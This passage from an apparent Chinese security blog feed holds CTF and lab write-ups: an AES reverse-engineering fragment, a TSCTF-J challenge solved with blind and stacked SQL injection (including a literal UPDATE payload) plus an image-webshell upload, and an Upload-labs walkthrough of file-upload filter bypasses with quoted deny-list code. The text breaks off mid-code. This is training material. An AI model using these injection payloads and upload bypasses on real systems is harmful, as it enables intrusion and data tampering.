rbp</span><br><span class="line">add     rax, rdx</span><br><span class="line">sub     rax, 20h ; &#x27; &#x27;</span><br><span class="line">movzx   ecx, byte ptr [rax]</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">lea     rdx, ds:0[rax*4]</span><br><span class="line">mov     rax, [rbp+arg_0]</span><br><span class="line">add     rdx, rax</span><br><span class="line">xor     ecx, r8d</span><br><span class="line">mov     eax, [rbp+var_8]</span><br><span class="line">cdqe</span><br><span class="line">mov     [rdx+rax], cl</span><br><span class="line">add     [rbp+var_8], 1</span><br></pre></td></tr></table></figure>

<p>这里重复的大段代码其实都是在矩阵中取出对应数字的操作，先计算出本轮密钥的起始地址，再赋值到r8d中，再用r8d和状态矩阵的对应位置进行异或</p>
<h2 id="0x05-flag解密"><a href="#0x05-flag解密" class="headerlink" title="0x05 flag解密"></a>0x05 flag解密</h2><p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205112250888.png" alt="image-20220511225045842"></p>
<p>在最后的循环比较中，cipher和var_90分别赋值给了edx和eax，然后比较了他们的低8位，也就是一个字节，一共循环32次，那么只需要我们加密后得到的var_90和预定义的cipher数组每一位都相等即可，我们可以使用aes的解密工具得出答案</p>
<p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205112253479.png" alt="image-20220511225354424"></p>
]]></content>
      <tags>
        <tag>逆向</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>TSCTF-J Badmac</title>
    <url>/2021/11/05/badmac/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本题考查sql注入（时间盲注，堆叠注入），文件上传漏洞</p>
<h1 id="一、题目"><a href="#一、题目" class="headerlink" title="一、题目"></a>一、题目</h1><p><img src="https://img-blog.csdnimg.cn/61ffbb2cc1f3421aaa18a765f92da389.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="二、题解"><a href="#二、题解" class="headerlink" title="二、题解"></a>二、题解</h1><h2 id="Part-1-：时间盲注"><a href="#Part-1-：时间盲注" class="headerlink" title="Part 1 ：时间盲注"></a>Part 1 ：时间盲注</h2><p>进入用户中心看到登陆页面，此处万能密码进不去，考虑sql注入</p>
<p><img src="https://img-blog.csdnimg.cn/bd9a4d35e1c940c9a2cf499aafd276a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p><strong>方法一：</strong></p>
<p>选用sqlmap注入，但需要的时间很长</p>
<p>选择时间盲注得到如下表<br><img src="https://img-blog.csdnimg.cn/fb49e330de2a4fb9af0eae5189188990.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_11,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>猜测登录的账户在<em>tsctfj_user</em>中，继续注出字段名和字段值得到用户名密码<br><img src="https://img-blog.csdnimg.cn/aa23c87c0f274561928bc8d192a315f9.png" alt="在这里插入图片描述"><br><strong>方法二：</strong><br>编写脚本采用二分法进行注入，速度会快很多，这里等我写出来了再补</p>
<h2 id="Part-2：堆叠注入"><a href="#Part-2：堆叠注入" class="headerlink" title="Part 2：堆叠注入"></a>Part 2：堆叠注入</h2><p>输入账号密码，登陆成功，进入了会员中心<br><img src="https://img-blog.csdnimg.cn/bc13a41d2b3b4c889e4a2fe67ecb4066.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">在信息栏中发现可以修改头像<br><img src="https://img-blog.csdnimg.cn/bf78c18400224308adb6cda0518d3138.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>尝试传入头像发现暂不开放<br><img src="https://img-blog.csdnimg.cn/91660a08c4d44145b295d3af3b5e6a9c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在网站中一番摸索后发现一篇奇怪的文章<br><img src="https://img-blog.csdnimg.cn/1ad142d8a3c549639ad4aca603444434.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/9df190806485476f82ee6b625f2b0bd0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看该文章居然需要如此多的积分，但我们没有积分，我也不可能去用户中心充值，那就只能继续注入，修改数据库中的数据，要么把我们的积分改多一些，要么就把这篇文章的积分改成0，或者也可以直接在数据库中把文章的内容注出来（都是中文，注入非常慢）</p>
<p><strong>堆叠注入原理</strong><br>堆叠注入，就是把sql语句堆叠在一起执行，通过闭合前面的查询语句并用; 分隔来执行任意sql语句，只要权限足够就可以经行增删改查。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;<span class="keyword">show</span> databases; </span><br></pre></td></tr></table></figure>
<p>堆叠注入也有局限性，要求服务器源代码中使用musqli_multi_quiery();（多语句查询函数，即可一次执行多条sql语句），若是使用mysqli_ query(); 则分号后面的语句不会执行，此环境中可使用堆叠注入</p>
<p><strong>注入过程</strong><br><img src="https://img-blog.csdnimg.cn/59c937dba22143a1b74ac38e5f1a6688.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a3e2cd83aaa545cba0267020e2383351.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>分别使用单引号和双引号闭合用户名得到的提示不同，输入单引号时提示用户登陆失败，则判断后端代码中sql语句使用的单引号<br>接下来要实现增删改查就必须得到该文章所在的表名以及各字段名，此时可以回顾<em>Part 1</em>中得到的表，猜测文章的表名为<em>tsctfj_art</em>（根据该文章的url地址也可以猜测出），盲注得出字段名（字段太多，用sqlmap极慢）<br><img src="https://img-blog.csdnimg.cn/05f19f44b1cb41f9bdf17154c10c5d78.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5b4d9953b98e4403bf1cc58345bb58e7.png" alt="在这里插入图片描述"><br>art_points和art_points_detail即为文章所需积分，我们选用update语句来修改数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">atestuserintsctf<span class="operator">-</span>j<span class="string">&#x27;;update tsctfj_art set art_points=0,art_points_detail=0 where art_id=1#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/314cfb3e53414893a14bbf5f396e58ad.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>提示用户登录失败时分号后的语句已经执行，登录上去验证一下发现该文章可以直接阅读，证明注入成功。<br><img src="https://img-blog.csdnimg.cn/d3987f0f0535419ba8a36bba1895e6b6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="Part-3：上传图片马"><a href="#Part-3：上传图片马" class="headerlink" title="Part 3：上传图片马"></a>Part 3：上传图片马</h2><p>提示要以get方式传值才能使用头像功能，我们使用burp来抓包加入这个参数，先点击上传头像后抓到该包<br><img src="https://img-blog.csdnimg.cn/8cf945a27b09481fa98d3beec6994ba1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这里的文件上传在文件名上过滤了php，文件类型也有很多限制，基本只让传图片，我们只能采用图片马（一张正常图片和一句话木马拼接）来上传webshell</p>
<p><img src="https://img-blog.csdnimg.cn/79d0d3b1ab764bd1b94c0609b03d4774.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>该图片用记事本打开如上所示，在结尾插入一句话木马的同时还可以使图片正常解析<br><img src="https://img-blog.csdnimg.cn/3b01e4c098bf4007934f8f1150a22af7.png" alt="在这里插入图片描述"><br>我们在抓取到的包中加入暗号再发包，提示上传成功，图片马的路径也在报文中了，头像也正常解析了出来<br><img src="https://img-blog.csdnimg.cn/c8e99e87f40a4d2ebb56d346b9d96d4d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/28a09ee27cc14a9ca4ac1897ca183f79.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>按照文件上传路径可以成功打开图片，但此时用蚁剑无法连接，因为这个图片会被服务器以jpg格式解析，图片里面的恶意代码不会生效，我们要成功连接图片马还需要上传解析文件，要让服务器按照我们上传的解析文件中的解析方式将图片解析为php，从而使一句话木马生效<br><img src="https://img-blog.csdnimg.cn/2ee6d50c84c44110a7e7565d7c065f35.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f32f446d46434951b2cd9b226ac6f33b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>上传成功后直接蚁剑连接，在根目录中找到flag<br><img src="https://img-blog.csdnimg.cn/c21974687716409a8ec565b35f5dba3c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/14c885620ffe4c1281c57ca25e3169f4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>文件上传</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Upload-labs靶场 01-11关攻略</title>
    <url>/2021/11/09/Upload-labs/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><img src="https://img-blog.csdnimg.cn/0e477baf39c14deda3e9bb6fc689299e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>文件上传漏洞靶场<a href="https://github.com/c0ny1/upload-labs">Upload-labs</a>，在github上下载后部署在win10本地，php版本为5.2.17，测试环境使用Kali虚拟机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/c0ny1/upload-labs</span><br></pre></td></tr></table></figure>


<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">


<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p><img src="https://img-blog.csdnimg.cn/bcbe592113e7455a9f64f4e81128846a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>首先尝试上传一句话木马up.php文件发现上传失败，并提示只允许.jpg|.png|.gif类型，但是我们的burp并没有抓到这个包，于是判断此处的限制为前端验证，我们直接查看源代码<br><img src="https://img-blog.csdnimg.cn/328a6f41377c4e8b90c8db26988de5fb.png" alt="在这里插入图片描述"><br>将此处判断文件类型的语句修改，即可正常绕过前端验证<br><img src="https://img-blog.csdnimg.cn/3dd15207efe14d3e92aeb5a26bbf5720.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功上传后界面出现了刚刚上传的图片，由于上传的是php文件，所以无法正常解析成图片<br><img src="https://img-blog.csdnimg.cn/a73a35c8560e4d07a6476284aa170d95.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>右键点击复制图像地址即可得到文件上传的路径，在蚁剑中直接连接<br><img src="https://img-blog.csdnimg.cn/5ded19fd9419431e9525905adf0958db.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><p><img src="https://img-blog.csdnimg.cn/edf1f65e61fe4e06b67021765f8dd409.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>先尝试能否直接上传up.php，提示文件类型不正确<br><img src="https://img-blog.csdnimg.cn/e99c08a5a86d49a185ff4cb6cecb11d1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在抓到的包中尝试修改Content-Type为image&#x2F;jpeg，继续上传<br><img src="https://img-blog.csdnimg.cn/94901542c4c548fabbaad655182d0217.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功上传，复制路径后蚁剑连接</p>
<h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><p><img src="https://img-blog.csdnimg.cn/0b879cdf72f0486886c0eb84059d28b8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>上传up.php后提示不允许以上后缀，我们尝试后缀改写绕过，将php改写为php5，成功上传，依旧可以被解析为php</p>
<p>（此处与不同环境的apache配置文件有关，配置文件中需要有下面这句话才可以成功）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">AddType application/x<span class="literal">-httpd-php</span> .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure>


<h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><p><img src="https://img-blog.csdnimg.cn/98bcecc9c34049de8fbd2bfc51faab1c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>本题使用以上几种方法均无法上传up.php，黑名单过滤的十分严密，基本只允许上传图片格式，但值得注意的是，黑名单中并没有.htaccess，于是我们可以选择上传.htaccess文件，既然只允许上传jpg文件，我们就上传jpg格式的一句话，再利用我们上传的.htaccess将jpg解析为php，构造如下文件</p>
<p><img src="https://img-blog.csdnimg.cn/d1d3b5f9edd14a78b1fafd9279109508.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6a86823e370b47e3a3f23a6a13269fcd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>再直接上传jpg格式的一句话，并用蚁剑连接</p>
<h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><p>本题相当刁钻，黑名单包括转换，大小写，空格，还有点号，几乎所有php文件都上传不了，并且拒绝上传 .htaccess 文件，源代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,</span><br><span class="line"><span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,</span><br><span class="line"><span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,</span><br><span class="line"><span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,</span><br><span class="line"><span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>黑名单中没有的后缀名有 <code>.php7</code> 以及 <code>.ini</code>，此处应该使用 <code>.user.ini</code>解析漏洞，思路和<code>.htaccess</code>有些相似<br>使用 <code>.user.ini</code> 解析漏洞需要三个前提条件：<br>①服务器后端语言为php<br>②文件上传目录中有可利用的php文件<br>③服务器使用CGI／FastCGI模式</p>
<p>这个漏洞非常少见，限制条件也很多，感觉实战中并不好用</p>
<p>本关的提示为上传目录存在readme.php，可以利用这个php文件<br><img src="https://img-blog.csdnimg.cn/787a87173d544931a5503bbc3c60bf77.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们先上传一个图片格式的一句话木马<br><img src="https://img-blog.csdnimg.cn/c1b6aeb56fe44914a37639d6253db348.png" alt="在这里插入图片描述"><br>再构造<code>.user.ini</code>如下，使目录下所有php文件都包含up.jpg，从而将恶意代码注入上传目录中已经存在的可利用php文件中<br><img src="https://img-blog.csdnimg.cn/2bf87b37da0d458b97aa17fa12a37a80.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/8d74c7560fa14ec28e1baf799b758333.png" alt="在这里插入图片描述"><br>根据提示可知，目录下有readme.php，我们输入该文件的地址即可连接<br><img src="https://img-blog.csdnimg.cn/6fa999f013ec4691ab2e93ac85423703.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><p><img src="https://img-blog.csdnimg.cn/d5acbea0b2994f6397dfd7cc4d96fe1b.png" alt="在这里插入图片描述"><br>直接大小写绕过</p>
<h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span 